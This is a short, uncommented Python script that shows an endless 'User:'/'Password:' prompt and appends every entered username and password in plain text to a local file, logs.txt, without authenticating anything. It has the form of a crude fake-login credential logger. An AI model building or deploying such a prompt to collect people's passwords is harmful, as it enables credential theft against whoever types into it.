import sys
orig = sys.stdout
def outprint():
  with open('logs.txt', 'a') as a:
    sys.stdout = a 
    print("\n Username: "+h+"\n Password:  "+s)
    sys.stdout = orig
while 0<1:
  h=input("User:  ")
  s=input("Password:  ")
  print("\n")
  outprint()
